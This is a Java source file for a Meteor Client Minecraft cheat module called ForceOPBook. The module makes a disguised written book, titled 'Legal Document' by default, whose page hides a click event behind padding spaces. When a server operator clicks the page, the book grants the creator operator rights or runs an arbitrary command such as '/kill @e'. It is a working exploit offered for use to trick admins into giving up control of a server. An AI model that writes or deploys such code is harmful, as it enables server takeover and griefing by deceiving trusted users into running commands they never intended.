package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.component.ComponentChanges;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.WrittenBookContentComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.text.ClickEvent;
import net.minecraft.text.MutableText;
import net.minecraft.text.RawFilteredPair;
import net.minecraft.text.Text;
import pwn.noobs.trouserstreak.Trouser;

import java.util.ArrayList;
import java.util.List;

public class ForceOPBook extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();
    private final Setting<Modes> mode = sgGeneral.add(new EnumSetting.Builder<Modes>()
            .name("Command Mode")
            .description("the mode")
            .defaultValue(Modes.ForceOP)
            .build());
    private final Setting<String> theCommand = sgGeneral.add(new StringSetting.Builder()
            .name("Command")
            .description("What command is run")
            .defaultValue("/kill @e")
            .visible(() -> mode.get() == Modes.AnyCommand)
            .build()
    );
    private final Setting<String> title = sgGeneral.add(new StringSetting.Builder()
            .name("Book Title")
            .description("The book's name")
            .defaultValue("Legal Document")
            .build()
    );
    private final Setting<String> author = sgGeneral.add(new StringSetting.Builder()
            .name("Book Author")
            .description("The book's author")
            .defaultValue("Satan")
            .build()
    );
    private final Setting<String> text = sgGeneral.add(new StringSetting.Builder()
            .name("Text")
            .description("What text is on the book's page")
            .defaultValue("§4Sign here to hand over your eternal soul ____________")
            .build()
    );

    public ForceOPBook() {
        super(Trouser.Main, "ForceOPBook", "Requires Creative mode! Creates a Book that can run commands in your inventory. Give it to someone with OP and have them click on the page in the book.");
    }

    @Override
    public void onActivate() {
        if (mc.player == null || mc.interactionManager == null) return;
        if (!mc.player.getAbilities().creativeMode) {
            error("You need creative mode to make the book.");
            toggle();
            return;
        }
        ItemStack stack = new ItemStack(Items.WRITTEN_BOOK);
        RawFilteredPair<String> Title = RawFilteredPair.of(title.get());
        List<RawFilteredPair<Text>> pages = new ArrayList<>();
        if (mode.get() == Modes.ForceOP){
            MutableText pageText = Text.literal(text.get()+"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ")
                    .styled(style -> style.withClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, "/op "+mc.player.getName().getLiteralString())));
            pages.add(RawFilteredPair.of(pageText));
        } else {
            MutableText pageText = Text.literal(text.get()+"                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ")
                    .styled(style -> style.withClickEvent(new ClickEvent(ClickEvent.Action.RUN_COMMAND, theCommand.get())));
            pages.add(RawFilteredPair.of(pageText));
        }
        WrittenBookContentComponent bookContentComponent = new WrittenBookContentComponent(
                Title, author.get(), 0, pages, true
        );

        var changes = ComponentChanges.builder()
                .add(DataComponentTypes.WRITTEN_BOOK_CONTENT, bookContentComponent)
                .build();

        stack.applyChanges(changes);

        mc.interactionManager.clickCreativeStack(stack, 36 + mc.player.getInventory().selectedSlot);
        info("Book created.");

        toggle();
    }
    public enum Modes {
        ForceOP, AnyCommand
    }
    public enum bookModes {
        WritableBook, WrittenBook
    }
}